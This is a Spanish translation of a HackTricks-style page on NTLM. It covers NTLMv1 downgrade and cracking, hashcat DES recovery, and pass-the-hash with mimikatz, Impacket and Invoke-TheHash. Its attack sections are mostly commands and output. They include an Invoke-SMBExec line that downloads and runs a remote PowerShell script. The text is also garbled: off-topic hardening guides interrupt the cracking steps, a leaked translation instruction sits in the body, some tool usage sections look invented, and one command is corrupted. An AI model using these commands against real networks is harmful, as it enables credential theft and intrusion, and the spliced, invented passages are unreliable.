# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información básica

**Credenciales NTLM**: Nombre de dominio (si corresponde), nombre de usuario y hash de contraseña.

**LM** solo está **habilitado** en **Windows XP y Server 2003** (los hashes LM se pueden descifrar). El hash LM AAD3B435B51404EEAAD3B435B51404EE significa que no se está utilizando LM (es el hash LM de una cadena vacía).

Por defecto, se utiliza **Kerberos**, por lo que NTLM solo se utilizará si no hay ningún Active Directory configurado, el dominio no existe, Kerberos no está funcionando (mala configuración) o el cliente que intenta conectarse utiliza la dirección IP en lugar de un nombre de host válido.

Los paquetes de red de una autenticación NTLM tienen el encabezado "**NTLMSSP**".

Los protocolos: LM, NTLMv1 y NTLMv2 son compatibles en la DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 y NTLMv2

Puedes verificar y configurar qué protocolo se utilizará:

### GUI

Ejecuta _secpol.msc_ -> Directivas locales -> Opciones de seguridad -> Seguridad de red: Nivel de autenticación de LAN Manager. Hay 6 niveles (del 0 al 5).

![](<../../.gitbook/assets/image (92).png>)

### Registro

Esto establecerá el nivel 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores posibles:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticación de dominio NTLM

1. El **usuario** introduce sus **credenciales**
2. La máquina cliente **envía una solicitud de autenticación** enviando el **nombre de dominio** y el **nombre de usuario**
3. El **servidor** envía el **desafío**
4. El cliente **encripta** el **desafío** utilizando el hash de la contraseña como clave y lo envía como respuesta
5. El **servidor envía** al **controlador de dominio** el **nombre de dominio, el nombre de usuario, el desafío y la respuesta**. Si no hay un Directorio Activo configurado o el nombre de dominio es el nombre del servidor, las credenciales se **verifican localmente**.
6. El **controlador de dominio verifica si todo es correcto** y envía la información al servidor

El **servidor** y el **controlador de dominio** pueden crear un **canal seguro** a través del servidor **Netlogon**, ya que el controlador de dominio conoce la contraseña del servidor (está dentro de la base de datos **NTDS.DIT**).

### Esquema de autenticación NTLM local

La autenticación es como la mencionada **anteriormente, pero** el **servidor** conoce el **hash del usuario** que intenta autenticarse dentro del archivo **SAM**. Por lo tanto, en lugar de preguntar al controlador de dominio, el **servidor verificará por sí mismo** si el usuario puede autenticarse.

### Desafío NTLMv1

La longitud del **desafío es de 8 bytes** y la **respuesta tiene una longitud de 24 bytes**.

El **hash NT (16 bytes)** se divide en **3 partes de 7 bytes cada una** (7B + 7B + (2B+0x00\*5)): la **última parte se llena con ceros**. Luego, el **desafío** se **cifra por separado** con cada parte y los bytes cifrados resultantes se **unen**. Total: 8B + 8B + 8B = 24 bytes.

**Problemas**:

* Falta de **aleatoriedad**
* Las 3 partes se pueden **atacar por separado** para encontrar el hash NT
* **DES es vulnerable**
* La tercera clave está compuesta siempre por **5 ceros**.
* Dado el **mismo desafío**, la **respuesta** será **la misma**. Por lo tanto, puedes dar como **desafío** a la víctima la cadena "**1122334455667788**" y atacar la respuesta utilizando **tablas arcoíris precalculadas**.

### Ataque NTLMv1

Actualmente es menos común encontrar entornos con la Delegación no restringida configurada, pero esto no significa que no puedas **abusar de un servicio de cola de impresión** configurado.

Podrías abusar de algunas credenciales/sesiones que ya tienes en el Directorio Activo para **solicitar a la impresora que se autentique** contra algún **host bajo tu control**. Luego, utilizando `metasploit auxiliary/server/capture/smb` o `responder`, puedes **establecer el desafío de autenticación en 1122334455667788**, capturar el intento de autenticación y, si se realizó utilizando **NTLMv1**, podrás **descifrarlo**.\
Si estás utilizando `responder`, podrías intentar **usar la bandera `--lm`** para intentar **reducir la seguridad** de la **autenticación**.\
_Ten en cuenta que para esta técnica la autenticación debe realizarse utilizando NTLMv1 (NTLMv2 no es válido)._

Recuerda que la impresora utilizará la cuenta de equipo durante la autenticación, y las cuentas de equipo utilizan contraseñas **largas y aleatorias** que **probablemente no podrás descifrar** utilizando diccionarios comunes. Pero la autenticación **NTLMv1** utiliza DES ([más información aquí](./#desafío-ntlmv1)), por lo que utilizando algunos servicios especialmente dedicados a descifrar DES podrás descifrarlo (por ejemplo, podrías usar [https://crack.sh/](https://crack.sh)).

### Ataque NTLMv1 con hashcat

NTLMv1 también se puede romper con la herramienta NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), que formatea los mensajes NTLMv1 de una manera que se puede romper con hashcat.

El comando
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
``` would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# Fortalecimiento de Windows: NTLM

## Descripción

El protocolo NTLM (NT LAN Manager) es un protocolo de autenticación utilizado en sistemas operativos Windows. Aunque ha sido ampliamente utilizado en el pasado, NTLM presenta varias vulnerabilidades que pueden ser explotadas por los atacantes para comprometer la seguridad de un sistema.

Este documento proporciona una guía paso a paso sobre cómo fortalecer la seguridad de Windows al mitigar las vulnerabilidades asociadas con el protocolo NTLM.

## Contenido

1. [Introducción](introduction.md)
2. [Desactivar NTLMv1](disable-ntlmv1.md)
3. [Configurar la directiva de seguridad de NTLM](configure-ntlm-security-policy.md)
4. [Implementar autenticación multifactor](implement-multifactor-authentication.md)
5. [Utilizar Kerberos en lugar de NTLM](use-kerberos-instead-of-ntlm.md)
6. [Monitorear y detectar ataques NTLM](monitor-and-detect-ntlm-attacks.md)
7. [Conclusiones](conclusion.md)

## Contribución

Si desea contribuir a este proyecto, por favor siga las siguientes pautas:

1. Realice un fork del repositorio.
2. Cree una rama para su contribución.
3. Realice los cambios y mejoras necesarios.
4. Envíe una solicitud de extracción.

## Licencia

Este proyecto está licenciado bajo la Licencia MIT. Consulte el archivo [LICENSE](LICENSE) para obtener más información.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Ejecuta hashcat (es mejor distribuirlo a través de una herramienta como hashtopolis) ya que de lo contrario esto tomará varios días.
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
En este caso sabemos que la contraseña es "password", por lo que vamos a hacer trampa con fines de demostración:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ahora necesitamos utilizar las utilidades de hashcat para convertir las claves DES descifradas en partes del hash NTLM:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
# Protección de Windows: Configuración de NTLM

## Introducción

El Protocolo de Autenticación de Windows NT LAN Manager (NTLM) es un protocolo de autenticación utilizado en sistemas operativos Windows. Sin embargo, NTLM tiene algunas vulnerabilidades conocidas que pueden ser explotadas por los atacantes para comprometer la seguridad de un sistema.

En este documento, se proporcionarán recomendaciones para endurecer la configuración de NTLM en Windows y mitigar posibles ataques.

## Deshabilitar NTLMv1

NTLMv1 es una versión antigua y menos segura del protocolo NTLM. Se recomienda deshabilitar NTLMv1 y permitir solo NTLMv2, que es más seguro.

Para deshabilitar NTLMv1, siga estos pasos:

1. Abra el Editor de directivas de grupo escribiendo "gpedit.msc" en el menú Inicio o en el cuadro de búsqueda.
2. Navegue hasta "Configuración del equipo" > "Directivas" > "Configuración de Windows" > "Configuración de seguridad" > "Directivas locales" > "Opciones de seguridad".
3. Busque la opción "Network security: LAN Manager authentication level" y haga doble clic en ella.
4. Seleccione "Enviar respuestas de autenticación solo NTLMv2" y haga clic en "Aceptar".

## Habilitar la firma de NTLM

La firma de NTLM es una característica que agrega un nivel adicional de seguridad al protocolo NTLM. Al habilitar la firma de NTLM, se garantiza que los mensajes NTLM no hayan sido modificados durante la transmisión.

Para habilitar la firma de NTLM, siga estos pasos:

1. Abra el Editor de directivas de grupo escribiendo "gpedit.msc" en el menú Inicio o en el cuadro de búsqueda.
2. Navegue hasta "Configuración del equipo" > "Directivas" > "Configuración de Windows" > "Configuración de seguridad" > "Directivas locales" > "Opciones de seguridad".
3. Busque la opción "Network security: Minimum session security for NTLM SSP based (including secure RPC) clients" y haga doble clic en ella.
4. Marque las casillas "Require NTLMv2 session security" y "Require 128-bit encryption" y haga clic en "Aceptar".

## Restringir el uso de NTLM

Para mejorar la seguridad, se recomienda restringir el uso de NTLM y fomentar el uso de métodos de autenticación más seguros, como Kerberos.

Para restringir el uso de NTLM, siga estos pasos:

1. Abra el Editor de directivas de grupo escribiendo "gpedit.msc" en el menú Inicio o en el cuadro de búsqueda.
2. Navegue hasta "Configuración del equipo" > "Directivas" > "Configuración de Windows" > "Configuración de seguridad" > "Directivas locales" > "Opciones de seguridad".
3. Busque la opción "Network security: Restrict NTLM: Incoming NTLM traffic" y haga doble clic en ella.
4. Seleccione "Deny all accounts" y haga clic en "Aceptar".

## Conclusión

Al seguir estas recomendaciones, puede fortalecer la configuración de NTLM en Windows y reducir el riesgo de posibles ataques. Recuerde que la seguridad es un proceso continuo y es importante mantenerse actualizado con las últimas prácticas recomendadas.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
El siguiente contenido es de un libro de hacking sobre técnicas de hacking. El siguiente contenido es del archivo windows-hardening/ntlm/README.md. Traduzca el texto en inglés relevante al español y devuelva la traducción manteniendo exactamente la misma sintaxis de markdown y html. No traduzca cosas como código, nombres de técnicas de hacking, palabras de hacking, nombres de plataformas en la nube/SaaS (como Workspace, aws, gcp...), la palabra 'leak', pentesting y etiquetas de markdown. Tampoco agregue nada aparte de la traducción y la sintaxis de markdown.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Desafío NTLMv2

La longitud del desafío es de 8 bytes y se envían 2 respuestas: una tiene una longitud de 24 bytes y la longitud de la otra es variable.

La primera respuesta se crea cifrando con HMAC_MD5 la cadena compuesta por el cliente y el dominio, utilizando como clave el hash MD4 del hash NT. Luego, el resultado se utilizará como clave para cifrar el desafío utilizando HMAC_MD5. A esto se le agregará un desafío del cliente de 8 bytes. Total: 24 B.

La segunda respuesta se crea utilizando varios valores (un nuevo desafío del cliente, una marca de tiempo para evitar ataques de repetición, etc.).

Si tienes un archivo pcap que ha capturado un proceso de autenticación exitoso, puedes seguir esta guía para obtener el dominio, el nombre de usuario, el desafío y la respuesta, e intentar descifrar la contraseña: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pase de Hash

Una vez que tienes el hash de la víctima, puedes usarlo para hacerse pasar por ella.
Necesitas usar una herramienta que realice la autenticación NTLM utilizando ese hash, o puedes crear un nuevo inicio de sesión de sesión e inyectar ese hash dentro de LSASS, para que cuando se realice cualquier autenticación NTLM, se utilice ese hash. La última opción es lo que hace mimikatz.

Por favor, recuerda que también puedes realizar ataques de Pase de Hash utilizando cuentas de computadora.

### Mimikatz

Debe ejecutarse como administrador.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Esto lanzará un proceso que pertenecerá a los usuarios que hayan lanzado mimikatz, pero internamente en LSASS, las credenciales guardadas serán las que están dentro de los parámetros de mimikatz. Luego, podrás acceder a los recursos de la red como si fueras ese usuario (similar al truco `runas /netonly`, pero no necesitas conocer la contraseña en texto plano).

### Pass-the-Hash desde Linux

Puedes obtener ejecución de código en máquinas Windows utilizando Pass-the-Hash desde Linux.\
[**Accede aquí para aprender cómo hacerlo.**](../../windows/ntlm/broken-reference/)

### Herramientas compiladas de Impacket para Windows

Puedes descargar los binarios de impacket para Windows aquí: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (En este caso, necesitas especificar un comando, cmd.exe y powershell.exe no son válidos para obtener una shell interactiva) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Hay varios binarios más de Impacket...

### Invoke-TheHash

Puedes obtener los scripts de PowerShell desde aquí: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

El comando `Invoke-WMIExec` es una herramienta de pentesting que permite ejecutar comandos en un sistema remoto utilizando la interfaz de administración de Windows (WMI). Esta técnica es útil para obtener acceso a sistemas Windows y ejecutar comandos de forma remota sin necesidad de autenticación adicional.

##### Uso

```
Invoke-WMIExec -Target <IP> -Username <Username> -Password <Password> -Command <Command>
```

##### Parámetros

- `Target`: La dirección IP del sistema remoto.
- `Username`: El nombre de usuario para autenticarse en el sistema remoto.
- `Password`: La contraseña correspondiente al nombre de usuario proporcionado.
- `Command`: El comando que se ejecutará en el sistema remoto.

##### Ejemplo

```
Invoke-WMIExec -Target 192.168.0.100 -Username Administrator -Password P@ssw0rd -Command "net user"
```

Este ejemplo ejecutará el comando `net user` en el sistema remoto con la dirección IP `192.168.0.100`, utilizando las credenciales del usuario `Administrator` y la contraseña `P@ssw0rd`. El resultado del comando se mostrará en la consola.

**Nota**: Es importante tener en cuenta que esta técnica puede ser detectada por soluciones de seguridad y antivirus, por lo que se recomienda utilizarla con precaución y solo en entornos controlados y autorizados.
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

El comando `Invoke-SMBClient` es una herramienta de PowerShell que permite interactuar con el protocolo SMB (Server Message Block) en sistemas Windows. Esta herramienta se utiliza para realizar pruebas de penetración y evaluar la seguridad de los sistemas Windows.

El comando `Invoke-SMBClient` se utiliza para establecer una conexión SMB con un servidor remoto y realizar diversas acciones, como enumerar recursos compartidos, descargar o cargar archivos, ejecutar comandos remotos y obtener información del sistema.

Para utilizar `Invoke-SMBClient`, se requiere tener privilegios de administrador en el sistema objetivo. Además, es importante tener en cuenta que el uso de esta herramienta puede ser detectado por los sistemas de seguridad y generar alertas.

A continuación se muestra un ejemplo de cómo utilizar `Invoke-SMBClient` para enumerar los recursos compartidos en un servidor remoto:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -EnumerateShares
```

En este ejemplo, se establece una conexión SMB con el servidor remoto con la dirección IP `192.168.1.100` utilizando las credenciales del usuario `Administrator` y la contraseña `P@ssw0rd`. Luego, se utiliza el parámetro `-EnumerateShares` para enumerar los recursos compartidos en el servidor.

Es importante destacar que el uso de `Invoke-SMBClient` debe realizarse de manera ética y con el consentimiento del propietario del sistema objetivo.
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

El comando `Invoke-SMBEnum` es una herramienta de enumeración de SMB (Server Message Block) que se utiliza para recopilar información sobre un sistema Windows objetivo. Esta herramienta aprovecha las debilidades en la implementación de SMB para obtener información valiosa sobre el sistema objetivo.

##### Uso

```
Invoke-SMBEnum -Target <IP> -Username <username> -Password <password>
```

##### Parámetros

- `Target`: La dirección IP del sistema Windows objetivo.
- `Username`: El nombre de usuario para autenticarse en el sistema objetivo.
- `Password`: La contraseña correspondiente al nombre de usuario proporcionado.

##### Descripción

El comando `Invoke-SMBEnum` utiliza técnicas de enumeración de SMB para recopilar información sobre el sistema objetivo. Esto incluye la enumeración de usuarios, grupos, recursos compartidos, políticas de seguridad y más. La herramienta aprovecha las debilidades en la implementación de SMB para obtener acceso a esta información.

##### Ejemplo

```
Invoke-SMBEnum -Target 192.168.1.100 -Username administrator -Password P@ssw0rd
```

Este ejemplo muestra cómo utilizar `Invoke-SMBEnum` para enumerar información sobre un sistema Windows con la dirección IP `192.168.1.100`. Se autentica en el sistema objetivo utilizando el nombre de usuario `administrator` y la contraseña `P@ssw0rd`.
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta función es una **combinación de todas las demás**. Puedes pasar **varios hosts**, **excluir** algunos y **seleccionar** la **opción** que deseas usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si seleccionas **cualquiera** de **SMBExec** y **WMIExec** pero no proporcionas ningún parámetro de _**Command**_, solo verificará si tienes **suficientes permisos**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Editor de Credenciales de Windows (WCE)

**Debe ejecutarse como administrador**

Esta herramienta hará lo mismo que mimikatz (modificar la memoria de LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ejecución remota manual en Windows con nombre de usuario y contraseña

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extracción de credenciales de un host de Windows

**Para obtener más información sobre** [**cómo obtener credenciales de un host de Windows, debes leer esta página**](broken-reference)**.**

## NTLM Relay y Responder

**Lee una guía más detallada sobre cómo realizar estos ataques aquí:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analizar desafíos NTLM desde una captura de red

**Puedes utilizar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
